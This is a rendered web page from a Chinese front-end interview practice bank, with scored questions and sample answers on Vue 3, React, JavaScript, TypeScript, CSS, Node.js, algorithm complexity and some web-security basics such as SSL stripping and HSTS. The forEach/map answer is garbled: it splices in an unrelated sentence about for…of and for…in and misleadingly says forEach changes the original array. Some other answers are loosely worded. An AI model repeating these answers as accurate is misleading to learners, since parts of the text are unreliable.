<!DOCTYPE html>
<html lang="en-US" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>前端面试题库</title>
    <meta name="description" content="致力于为前端人员提供全面可靠的专业知识">
    <meta name="generator" content="VitePress v1.5.0">
    <link rel="preload stylesheet" href="/mb-front-end-interview/assets/style.DEQL0GKN.css" as="style">
    <link rel="preload stylesheet" href="/mb-front-end-interview/vp-icons.css" as="style">
    
    <script type="module" src="/mb-front-end-interview/assets/app.B3A29GN8.js"></script>
    <link rel="preload" href="/mb-front-end-interview/assets/inter-roman-latin.Di8DUHzh.woff2" as="font" type="font/woff2" crossorigin="">
    <link rel="modulepreload" href="/mb-front-end-interview/assets/chunks/theme.eZpaJblD.js">
    <link rel="modulepreload" href="/mb-front-end-interview/assets/chunks/framework.BZMTKtii.js">
    <link rel="modulepreload" href="/mb-front-end-interview/assets/chunks/componentMarkdown.CPvx0E5s.js">
    <link rel="modulepreload" href="/mb-front-end-interview/assets/src_training_training-primary_index.md.B6cq_CSz.lean.js">
    <script id="check-dark-mode">(()=>{const e=localStorage.getItem("vitepress-theme-appearance")||"auto",a=window.matchMedia("(prefers-color-scheme: dark)").matches;(!e||e==="auto"?a:e==="dark")&&document.documentElement.classList.add("dark")})();</script>
    <script id="check-mac-os">document.documentElement.classList.toggle("mac",/Mac|iPhone|iPod|iPad/i.test(navigator.platform));</script>
  </head>
  <body>
    <div id="app"><div class="Layout" data-v-d8b57b2d><!--[--><!--]--><!--[--><span tabindex="-1" data-v-c8291ffa></span><a href="#VPContent" class="VPSkipLink visually-hidden" data-v-c8291ffa> Skip to content </a><!--]--><!----><header class="VPNav" data-v-d8b57b2d data-v-7ad780c2><div class="VPNavBar" data-v-7ad780c2 data-v-9fd4d1dd><div class="wrapper" data-v-9fd4d1dd><div class="container" data-v-9fd4d1dd><div class="title" data-v-9fd4d1dd><div class="VPNavBarTitle has-sidebar" data-v-9fd4d1dd data-v-9f43907a><a class="title" href="/mb-front-end-interview/" data-v-9f43907a><!--[--><!--]--><!----><span data-v-9f43907a>前端面试题库</span><!--[--><!--]--></a></div></div><div class="content" data-v-9fd4d1dd><div class="content-body" data-v-9fd4d1dd><!--[--><!--]--><div class="VPNavBarSearch search" data-v-9fd4d1dd><!--[--><!----><div id="local-search"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索文档"><span class="DocSearch-Button-Container"><span class="vp-icon DocSearch-Search-Icon"></span><span class="DocSearch-Button-Placeholder">搜索文档</span></span><span class="DocSearch-Button-Keys"><kbd class="DocSearch-Button-Key"></kbd><kbd class="DocSearch-Button-Key">K</kbd></span></button></div><!--]--></div><nav aria-labelledby="main-nav-aria-label" class="VPNavBarMenu menu" data-v-9fd4d1dd data-v-afb2845e><span id="main-nav-aria-label" class="visually-hidden" data-v-afb2845e> Main Navigation </span><!--[--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/mb-front-end-interview/src/guide/why.html" tabindex="0" data-v-afb2845e data-v-815115f5><!--[--><span data-v-815115f5>指南</span><!--]--></a><!--]--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/mb-front-end-interview/src/questions/front-base/1_HTML.html" tabindex="0" data-v-afb2845e data-v-815115f5><!--[--><span data-v-815115f5>题库</span><!--]--></a><!--]--><!--[--><a class="VPLink link VPNavBarMenuLink active" href="/mb-front-end-interview/src/training/training-primary/index.html" tabindex="0" data-v-afb2845e data-v-815115f5><!--[--><span data-v-815115f5>训练</span><!--]--></a><!--]--><!--]--></nav><!----><div class="VPNavBarAppearance appearance" data-v-9fd4d1dd data-v-3f90c1a5><button class="VPSwitch VPSwitchAppearance" type="button" role="switch" title aria-checked="false" data-v-3f90c1a5 data-v-be9742d9 data-v-b4ccac88><span class="check" data-v-b4ccac88><span class="icon" data-v-b4ccac88><!--[--><span class="vpi-sun sun" data-v-be9742d9></span><span class="vpi-moon moon" data-v-be9742d9></span><!--]--></span></span></button></div><div class="VPSocialLinks VPNavBarSocialLinks social-links" data-v-9fd4d1dd data-v-ef6192dc data-v-e71e869c><!--[--><a class="VPSocialLink no-icon" href="https://github.com/syh-micro-build/mb-front-end-interview" aria-label="github" target="_blank" rel="noopener" data-v-e71e869c data-v-60a9a2d3><span class="vpi-social-github"></span></a><!--]--></div><div class="VPFlyout VPNavBarExtra extra" data-v-9fd4d1dd data-v-f953d92f data-v-bfe7971f><button type="button" class="button" aria-haspopup="true" aria-expanded="false" aria-label="extra navigation" data-v-bfe7971f><span class="vpi-more-horizontal icon" data-v-bfe7971f></span></button><div class="menu" data-v-bfe7971f><div class="VPMenu" data-v-bfe7971f data-v-20ed86d6><!----><!--[--><!--[--><!----><div class="group" data-v-f953d92f><div class="item appearance" data-v-f953d92f><p class="label" data-v-f953d92f>主题</p><div class="appearance-action" data-v-f953d92f><button class="VPSwitch VPSwitchAppearance" type="button" role="switch" title aria-checked="false" data-v-f953d92f data-v-be9742d9 data-v-b4ccac88><span class="check" data-v-b4ccac88><span class="icon" data-v-b4ccac88><!--[--><span class="vpi-sun sun" data-v-be9742d9></span><span class="vpi-moon moon" data-v-be9742d9></span><!--]--></span></span></button></div></div></div><div class="group" data-v-f953d92f><div class="item social-links" data-v-f953d92f><div class="VPSocialLinks social-links-list" data-v-f953d92f data-v-e71e869c><!--[--><a class="VPSocialLink no-icon" href="https://github.com/syh-micro-build/mb-front-end-interview" aria-label="github" target="_blank" rel="noopener" data-v-e71e869c data-v-60a9a2d3><span class="vpi-social-github"></span></a><!--]--></div></div></div><!--]--><!--]--></div></div></div><!--[--><!--]--><button type="button" class="VPNavBarHamburger hamburger" aria-label="mobile navigation" aria-expanded="false" aria-controls="VPNavScreen" data-v-9fd4d1dd data-v-6bee1efd><span class="container" data-v-6bee1efd><span class="top" data-v-6bee1efd></span><span class="middle" data-v-6bee1efd></span><span class="bottom" data-v-6bee1efd></span></span></button></div></div></div></div><div class="divider" data-v-9fd4d1dd><div class="divider-line" data-v-9fd4d1dd></div></div></div><!----></header><div class="VPLocalNav has-sidebar empty" data-v-d8b57b2d data-v-2488c25a><div class="container" data-v-2488c25a><button class="menu" aria-expanded="false" aria-controls="VPSidebarNav" data-v-2488c25a><span class="vpi-align-left menu-icon" data-v-2488c25a></span><span class="menu-text" data-v-2488c25a>菜单</span></button><div class="VPLocalNavOutlineDropdown" style="--vp-vh:0px;" data-v-2488c25a data-v-883964e0><button data-v-883964e0>回到顶部</button><!----></div></div></div><aside class="VPSidebar" data-v-d8b57b2d data-v-42c4c606><div class="curtain" data-v-42c4c606></div><nav class="nav" id="VPSidebarNav" aria-labelledby="sidebar-aria-label" tabindex="-1" data-v-42c4c606><span class="visually-hidden" id="sidebar-aria-label" data-v-42c4c606> Sidebar Navigation </span><!--[--><!--]--><!--[--><div class="no-transition group" data-v-51288d80><section class="VPSidebarItem level-0 collapsible has-active" data-v-51288d80 data-v-edd2eed8><div class="item" role="button" tabindex="0" data-v-edd2eed8><div class="indicator" data-v-edd2eed8></div><h2 class="text" data-v-edd2eed8>初级</h2><div class="caret" role="button" aria-label="toggle section" tabindex="0" data-v-edd2eed8><span class="vpi-chevron-right caret-icon" data-v-edd2eed8></span></div></div><div class="items" data-v-edd2eed8><!--[--><div class="VPSidebarItem level-1 is-link" data-v-edd2eed8 data-v-edd2eed8><div class="item" data-v-edd2eed8><div class="indicator" data-v-edd2eed8></div><a class="VPLink link link" href="/mb-front-end-interview/src/training/training-primary/index.html" data-v-edd2eed8><!--[--><p class="text" data-v-edd2eed8>开始训练</p><!--]--></a><!----></div><!----></div><!--]--></div></section></div><div class="no-transition group" data-v-51288d80><section class="VPSidebarItem level-0 collapsible collapsed" data-v-51288d80 data-v-edd2eed8><div class="item" role="button" tabindex="0" data-v-edd2eed8><div class="indicator" data-v-edd2eed8></div><h2 class="text" data-v-edd2eed8>中级</h2><div class="caret" role="button" aria-label="toggle section" tabindex="0" data-v-edd2eed8><span class="vpi-chevron-right caret-icon" data-v-edd2eed8></span></div></div><div class="items" data-v-edd2eed8><!--[--><div class="VPSidebarItem level-1 is-link" data-v-edd2eed8 data-v-edd2eed8><div class="item" data-v-edd2eed8><div class="indicator" data-v-edd2eed8></div><a class="VPLink link link" href="/mb-front-end-interview/src/training/training-intermediate/index.html" data-v-edd2eed8><!--[--><p class="text" data-v-edd2eed8>开始训练</p><!--]--></a><!----></div><!----></div><!--]--></div></section></div><div class="no-transition group" data-v-51288d80><section class="VPSidebarItem level-0 collapsible collapsed" data-v-51288d80 data-v-edd2eed8><div class="item" role="button" tabindex="0" data-v-edd2eed8><div class="indicator" data-v-edd2eed8></div><h2 class="text" data-v-edd2eed8>高级</h2><div class="caret" role="button" aria-label="toggle section" tabindex="0" data-v-edd2eed8><span class="vpi-chevron-right caret-icon" data-v-edd2eed8></span></div></div><div class="items" data-v-edd2eed8><!--[--><div class="VPSidebarItem level-1 is-link" data-v-edd2eed8 data-v-edd2eed8><div class="item" data-v-edd2eed8><div class="indicator" data-v-edd2eed8></div><a class="VPLink link link" href="/mb-front-end-interview/src/training/training-senior/index.html" data-v-edd2eed8><!--[--><p class="text" data-v-edd2eed8>开始训练</p><!--]--></a><!----></div><!----></div><!--]--></div></section></div><div class="no-transition group" data-v-51288d80><section class="VPSidebarItem level-0 collapsible collapsed" data-v-51288d80 data-v-edd2eed8><div class="item" role="button" tabindex="0" data-v-edd2eed8><div class="indicator" data-v-edd2eed8></div><h2 class="text" data-v-edd2eed8>架构</h2><div class="caret" role="button" aria-label="toggle section" tabindex="0" data-v-edd2eed8><span class="vpi-chevron-right caret-icon" data-v-edd2eed8></span></div></div><div class="items" data-v-edd2eed8><!--[--><div class="VPSidebarItem level-1 is-link" data-v-edd2eed8 data-v-edd2eed8><div class="item" data-v-edd2eed8><div class="indicator" data-v-edd2eed8></div><a class="VPLink link link" href="/mb-front-end-interview/src/training/training-architecture/index.html" data-v-edd2eed8><!--[--><p class="text" data-v-edd2eed8>开始训练</p><!--]--></a><!----></div><!----></div><!--]--></div></section></div><div class="no-transition group" data-v-51288d80><section class="VPSidebarItem level-0 collapsible collapsed" data-v-51288d80 data-v-edd2eed8><div class="item" role="button" tabindex="0" data-v-edd2eed8><div class="indicator" data-v-edd2eed8></div><h2 class="text" data-v-edd2eed8>专家</h2><div class="caret" role="button" aria-label="toggle section" tabindex="0" data-v-edd2eed8><span class="vpi-chevron-right caret-icon" data-v-edd2eed8></span></div></div><div class="items" data-v-edd2eed8><!--[--><div class="VPSidebarItem level-1 is-link" data-v-edd2eed8 data-v-edd2eed8><div class="item" data-v-edd2eed8><div class="indicator" data-v-edd2eed8></div><a class="VPLink link link" href="/mb-front-end-interview/src/training/training-experts/index.html" data-v-edd2eed8><!--[--><p class="text" data-v-edd2eed8>开始训练</p><!--]--></a><!----></div><!----></div><!--]--></div></section></div><!--]--><!--[--><!--]--></nav></aside><div class="VPContent has-sidebar" id="VPContent" data-v-d8b57b2d data-v-9a6c75ad><div class="VPDoc has-sidebar has-aside" data-v-9a6c75ad data-v-e6f2a212><!--[--><!--]--><div class="container" data-v-e6f2a212><div class="aside" data-v-e6f2a212><div class="aside-curtain" data-v-e6f2a212></div><div class="aside-container" data-v-e6f2a212><div class="aside-content" data-v-e6f2a212><div class="VPDocAside" data-v-e6f2a212 data-v-cb998dce><!--[--><!--]--><!--[--><!--]--><nav aria-labelledby="doc-outline-aria-label" class="VPDocAsideOutline" data-v-cb998dce data-v-f610f197><div class="content" data-v-f610f197><div class="outline-marker" data-v-f610f197></div><div aria-level="2" class="outline-title" id="doc-outline-aria-label" role="heading" data-v-f610f197>页面导航</div><ul class="VPDocOutlineItem root" data-v-f610f197 data-v-53c99d69><!--[--><!--]--></ul></div></nav><!--[--><!--]--><div class="spacer" data-v-cb998dce></div><!--[--><!--]--><!----><!--[--><!--]--><!--[--><!--]--></div></div></div></div><div class="content" data-v-e6f2a212><div class="content-container" data-v-e6f2a212><!--[--><!--]--><main class="main" data-v-e6f2a212><div style="position:relative;" class="vp-doc _mb-front-end-interview_src_training_training-primary_" data-v-e6f2a212><div><div class="main-box"><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">60. SPA及其优缺点是什么？</h4><div class="head-re"><span class="head-score">1 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><p>单页面应用（Single Page Application, SPA）指的是在网页加载完成后不会因为用户的操作而进行整个页面的重新加载，而是利用路由机制实现 HTML 内容的变化、UI 和用户的交互。优点在于提高了用户体验，减轻了服务器的压力，并且实现了前后端分离。然而，初次加载耗时较长，浏览器前进后退功能不可直接使用，SEO 优化难度较大.</p>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">19. 在 Vue 3 项目中，如何进行 SSR（服务器端渲染）</h4><div class="head-re"><span class="head-score">3 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><ul>
<li><strong>0：</strong> 搭建项目基础：创建 Vue 3 项目，可使用@vue/cli工具，通过命令vue create my-ssr-app创建项目，选择相关 Vue 3 选项。</li>
<li><strong>1：</strong> 添加 SSR 相关依赖：安装<code>@vue/server-renderer</code>和<code>express</code>等依赖，<code>@vue/server-renderer</code>用于服务器端渲染，<code>express</code>作为服务器框架。命令
为<code>npm install @vue/server-renderer express</code>。</li>
<li><strong>1：</strong> 创建服务器文件：在项目根目录下创建server.js文件，用于创建服务器和处理 SSR 逻辑。在文件中，引入express，创建服务器实例，设置路由，使
用@vue/server-renderer将 Vue 组件渲染为 HTML 字符串并返回。</li>
<li><strong>1：</strong> 调整 Vue 项目代码：在 Vue 项目中，需要创建一个用于服务器端渲染的入口文件，如<code>entry-server.js</code>，在该文件中，创建 Vue 应用实例，并导出。同时，可能
需要调整一些组件的逻辑，以适应服务器端渲染的环境。</li>
</ul>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">10. ref与reactive的区别？</h4><div class="head-re"><span class="head-score">6 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><ul>
<li><strong>1：</strong> ref与reactive 是 Vue3 新推出的主要 API 之一，它们主要用于响应式数据的创建。</li>
<li><strong>1：</strong> ref 函数创建的响应式数据，在模板中可以直接被使用，在 JS 中需要通过 .value 的形式才能使用。</li>
<li><strong>1：</strong> ref 函数可以接收原始数据类型与引用数据类型。</li>
<li><strong>1：</strong> reactive 函数只能接收引用数据类型。</li>
<li><strong>1：</strong> ref 底层还是使用 reactive 来做，ref 是在 reactive 上在进行了封装，增强了其能力，使它支持了对原始数据类型的处理。</li>
<li><strong>1：</strong> 在 Vue3 中 reactive 能做的，ref 也能做，reactive 不能做的，ref 也能做。</li>
</ul>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">33. 怎么理解Vue的单向数据流？</h4><div class="head-re"><span class="head-score">2 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><p>单向数据流是指：数据在组件树中的流动方向，是从父组件流向子组件的。这个设计使得数据流更加可预测和易于调试，确保应用状态的一致性。</p>
<p>简单理解：父组件的状态对于子组件是只读的，子组件想改，只能通过事件的方式，通知父组件自己改。</p>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">37. watch怎么停止监听？</h4><div class="head-re"><span class="head-score">2 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><pre><code class="hljs language-js"><span class="hljs-keyword">import</span> { ref, watch } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span>
<span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)
<span class="hljs-keyword">const</span> soptWatch = <span class="hljs-title function_">watch</span>(<span class="hljs-function">() =&gt;</span> count.<span class="hljs-property">value</span>, <span class="hljs-function">(<span class="hljs-params">newVal, oldVal</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(newVal, oldVal)
})
<span class="hljs-title function_">soptWatch</span>()
</code></pre></details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">什么是代码的时间复杂度和空间复杂度</h4><div class="head-re"><span class="head-score">9 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><details>

<ul>
<li><strong>1：</strong> 时间复杂度和空间复杂度是衡量算法效率的两个重要指标</li>
<li><strong>1：</strong> 时间复杂度：用于描述算法执行所需的时间随输入规模增长的变化趋势。它主要关注算法中执行的基本操作次数。</li>
<li><strong>1：</strong> 常数时间复杂度：无论输入规模如何变化，算法执行的时间都是固定的。例如，从数组中获取指定下标的元素，无论数组大小是多少，获取操作的时间基本相同。</li>
</ul>
<pre><code class="hljs language-python">def <span class="hljs-title function_">get_element</span>(arr, index):
    <span class="hljs-keyword">return</span> arr[index]
</code></pre><ul>
<li><strong>1：</strong> 线性时间复杂度：算法执行时间与输入规模成正比。例如，遍历一个数组，对每个元素进行一次操作，操作次数随数组长度 n 线性增长。</li>
</ul>
<pre><code class="hljs language-python">def <span class="hljs-title function_">sum_array</span>(arr):
    total = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-attr">arr</span>:
        total += num
    <span class="hljs-keyword">return</span> total
</code></pre><ul>
<li><strong>1：</strong> 平方时间复杂度：常见于嵌套循环，算法执行时间与输入规模的平方成正比。例如，冒泡排序算法，其时间复杂度为 O (n²)，因为它包含两层嵌套循环，对于长度为 n 的
数组，总的比较次数为 n*(n - 1)/2。</li>
</ul>
<pre><code class="hljs language-python">def <span class="hljs-title function_">bubble_sort</span>(arr):
    n = <span class="hljs-title function_">len</span>(arr)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-title function_">range</span>(n):
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-title function_">range</span>(<span class="hljs-number">0</span>, n - i - <span class="hljs-number">1</span>):
            <span class="hljs-keyword">if</span> arr[j] &gt; arr[j + <span class="hljs-number">1</span>]:
                arr[j], arr[j + <span class="hljs-number">1</span>] = arr[j + <span class="hljs-number">1</span>], arr[j]
    <span class="hljs-keyword">return</span> arr
</code></pre><ul>
<li><strong>1：</strong> 空间复杂度：用于描述算法执行过程中所需的额外空间随输入规模增长的变化趋势。它主要关注算法在运行过程中创建的临时变量、数据结构等所占用的空间。</li>
<li><strong>1：</strong> 常数空间复杂度：算法执行过程中所需的额外空间是固定的，不随输入规模变化。例如，计算两个整数之和的函数，除了输入参数和返回值，没有使用额外的与输入规模相关的空间。</li>
</ul>
<pre><code class="hljs language-python">def <span class="hljs-title function_">add_numbers</span>(a, b):
    <span class="hljs-keyword">return</span> a + b
</code></pre><ul>
<li><strong>1：</strong> 线性空间复杂度：算法执行过程中所需的额外空间与输入规模成正比。例如，创建一个长度为 n 的数组来存储数据，其空间复杂度为 O (n)。</li>
</ul>
<pre><code class="hljs language-python">def <span class="hljs-title function_">create_array</span>(n):
    <span class="hljs-keyword">return</span> [<span class="hljs-number">0</span>] * n
</code></pre><ul>
<li><strong>1：</strong> 平方空间复杂度：常见于创建二维数组等情况，例如创建一个 n×n 的二维数组，其空间复杂度为 O (n²)。</li>
</ul>
<pre><code class="hljs language-python">def <span class="hljs-title function_">create_2d_array</span>(n):
    <span class="hljs-keyword">return</span> [[<span class="hljs-number">0</span>] * n <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-title function_">range</span>(n)]
</code></pre></details>

</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">https 存在的风险</h4><div class="head-re"><span class="head-score">4 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><ul>
<li><strong>:1</strong> 即使是服务器端开启了 https，也还是存在安全隐患，黑客可以利用 SSL Stripping 这种攻击手段，强制让 https 降级回 http，从而继续进行中间人攻击。</li>
<li><strong>:2</strong> 过程:</li>
</ul>
<blockquote>
<p>1、用户在浏览器里输入 URL 的时候往往不是从 https:// 开始的，而是直接从域名开始输入；<br>2、随后浏览器向服务器发起 http 通信;<br>3、攻击者把服务器端返回的跳转到 https 页面的响应拦截了，并且代替客户端和服务器端进行后续的通信。  </p>
</blockquote>
<ul>
<li><strong>:1</strong> 防御：</li>
</ul>
<blockquote>
<p>使用 HSTS（HTTP Strict Transport Security），通过 HTTP Header 以及一个预加载的清单，来告知浏览器在和网站进行通信的时候强制性使用 HTTPS，而不是通过明文的HTTP进行通信。
 并且当遇到证书或者链接不安全的时候，则首先警告用户，并且不再让用户继续进行不安全的通信。</p>
</blockquote>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">38. 怎么监听子组件内的错误？</h4><div class="head-re"><span class="head-score">2 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><pre><code class="hljs language-js"><span class="hljs-comment">// 子组件</span>
<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Error&quot;</span>);

<span class="hljs-comment">//父组件</span>
<span class="hljs-keyword">import</span> { onErrorCaptured } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span>

<span class="hljs-comment">// 监听到子组件错误，执行回调</span>
<span class="hljs-title function_">onErrorCaptured</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;error&#x27;</span>, err)
})
</code></pre></details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">2. == 和 === 的区别是什么？</h4><div class="head-re"><span class="head-score">2 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><ul>
<li><strong>1：</strong> == 是 宽松相等，会进行类型转换，比较前会先转换两边的操作数类型（例如，&#39;5&#39; == 5 为 true;</li>
<li><strong>1：</strong> === 是 严格相等，不会进行类型转换，只有两边的值和类型都相同才会返回 true（例如，&#39;5&#39; === 5 为 false;</li>
</ul>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">4. React 中如何处理事件？</h4><div class="head-re"><span class="head-score">3 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><ul>
<li><strong>1：</strong> React 事件处理的方式与原生 JavaScript 不同，React 使用事件委托来优化性能，并且事件名称采用驼峰命名法。</li>
</ul>
<pre><code class="hljs language-js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComponent</span>(<span class="hljs-params"></span>) {
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClick</span> = (<span class="hljs-params">event</span>) =&gt; {
    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;Button clicked!&#x27;</span>);
  };

  <span class="hljs-keyword">return</span> &lt;button onClick={handleClick}&gt;Click Me&lt;/button&gt;;
}
</code></pre><ul>
<li><strong>1：</strong> React 会自动绑定事件处理函数。</li>
<li><strong>1：</strong> 事件对象会被 React 规范化。</li>
</ul>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">14. Node.js的优点是什么？</h4><div class="head-re"><span class="head-score">2 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><ul>
<li><p>异步编程模型：Node.js采用了事件驱动、非阻塞I/O模型，使其能够在大量连接的情况下保持高性能和稳定性。</p>
</li>
<li><p>单一编程语言：Node.js使用的是JavaScript，这是一种被广大开发者所熟悉的语言，能够大大降低学习成本。</p>
</li>
<li><p>开源社区活跃：Node.js有一个非常活跃的开源社区，有大量的模块可供使用，极大地提高了开发效率。</p>
</li>
<li><p>跨平台性：Node.js可以在多种操作系统上运行，如Windows、Linux、macOS等。</p>
</li>
<li><p>高性能：由于Node.js的非阻塞I/O模型，使其在处理大量并发请求时具有极高的性能。</p>
</li>
<li><p>数据密集型应用：Node.js擅长处理数据密集型应用，如实时通信、实时流媒体、实时游戏等。</p>
</li>
</ul>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">28. forEach和map的区别？</h4><div class="head-re"><span class="head-score">2 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><ul>
<li><p>这方法都是用来遍历数组的，两者区别如下：</p>
</li>
<li><p>for…of 遍历获取的是对象的键值，for…in 获取的是对象的键名forEach()方法会针对每一个元素执行提供的函数，对数据的操作会改变原数组，该方法没有返回值；</p>
</li>
<li><p>map()方法不会改变原数组的值，返回一个新数组，新数组中的值为原数组调用函数处理之后的值；</p>
</li>
</ul>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">32. 解释 keyof typeof 的组合用法</h4><div class="head-re"><span class="head-score">2 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><ul>
<li><strong>2：</strong> typeof 用于获取一个值的类型，keyof 用于获取一个类型的所有键组成的联合类型。keyof typeof 通常用于获取一个对象值的所有属性名组成的联合类型。示例：</li>
</ul>
<pre><code class="hljs language-ts"><span class="hljs-keyword">const</span> colors = {
    <span class="hljs-attr">red</span>: <span class="hljs-string">&#x27;#FF0000&#x27;</span>,
    <span class="hljs-attr">green</span>: <span class="hljs-string">&#x27;#00FF00&#x27;</span>,
    <span class="hljs-attr">blue</span>: <span class="hljs-string">&#x27;#0000FF&#x27;</span>
};
type <span class="hljs-title class_">ColorKeys</span> = keyof <span class="hljs-keyword">typeof</span> colors; 
<span class="hljs-comment">// ColorKeys 类型为 &#x27;red&#x27; | &#x27;green&#x27; | &#x27;blue&#x27;</span>
</code></pre></details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">2. margin 和 padding 的使用场景</h4><div class="head-re"><span class="head-score">1 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><ul>
<li><strong>1：</strong><ul>
<li>需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；</li>
<li>需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。</li>
</ul>
</li>
</ul>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">第三方依赖包带来的问题</h4><div class="head-re"><span class="head-score">2 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><ul>
<li><p><strong>:1</strong> 现在绝大多数的开发都是在借助开发框架和各种类库进行快速开发。这样做虽然方便快速，但是与此同时也存在安全风险，如果这些来自第三方的代码有安全漏洞，那么对应用整体的安全性依然会造成严峻的挑战。
比如 Node.js 有一些已知的安全漏洞，比如 CVE-2017-11499，可能导致前端应用受到 DoS 攻击。</p>
</li>
<li><p><strong>:1</strong> 防御：</p>
</li>
</ul>
<blockquote>
<p>使用 NSP(Node Security Platform)、Snyk 等等这类工具。</p>
</blockquote>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">假设你有一个使用 JavaScript 实现的表单提交功能，如何防止表单数据在提交过程中被篡改？</h4><div class="head-re"><span class="head-score">3 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><ul>
<li><strong>1：</strong> 数据加密：在前端对表单数据进行加密处理后再提交，后端接收数据后再进行解密。例如，可以使用如 AES 等加密算法，确保数据在传输过程中的完整性。</li>
<li><strong>1：</strong> 添加数字签名：使用非对称加密算法（如 RSA）对表单数据生成数字签名。在后端接收到数据后，验证数字签名的有效性。如果签名验证通过，说明数据
在传输过程中没有被篡改。</li>
<li><strong>1：</strong> 使用 HTTPS：通过使用 HTTPS 协议提交表单，防止数据在网络传输过程中被中间人篡改。</li>
</ul>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">22. png、jpg、gif这些图片格式解释一下，分别什么时候用？</h4><div class="head-re"><span class="head-score">2 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><p>png：无损压缩，尺寸体积要比jpg/jpeg的大。适合做小图标</p>
<p>jpg：采用压缩算法，有一点失真，比png体积要小。适合做中大图片</p>
<p>gif：一般是做动图</p>
<p>webp:同时支持有损或者无损压缩，相同质量的图片，webp具有更小的体积。兼容性不是特别好</p>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">59. 什么是Vue以及Vue的特点？</h4><div class="head-re"><span class="head-score">1 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><p>Vue 是一套用于构建用户界面的渐进式 JavaScript 框架。它的设计目标是通过尽可能简单的 API 实现响应的数据绑定和组合的视图组件。Vue 的特点包括但不限于：组件化开发，无需直接操作 DOM；使用虚拟 DOM 和 diff 算法复用 DOM 节点；提供简洁易用的模板语法.</p>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">72. Vue 3 中的 shallowRef 和 shallowReactive 是什么？</h4><div class="head-re"><span class="head-score">1 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><p>shallowRef：只对 .value 进行响应式处理。</p>
<p>shallowReactive：只对对象的第一层属性进行响应式处理。</p>
<pre><code class="hljs language-js">
<span class="hljs-keyword">import</span> { shallowRef, shallowReactive } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">setup</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">const</span> count = <span class="hljs-title function_">shallowRef</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 基本类型</span>
    <span class="hljs-keyword">const</span> state = <span class="hljs-title function_">shallowReactive</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Vue 3&#x27;</span>, <span class="hljs-attr">info</span>: { <span class="hljs-attr">age</span>: <span class="hljs-number">3</span> } }); <span class="hljs-comment">// 对象类型</span>

    <span class="hljs-keyword">return</span> { count, state };
  }
};
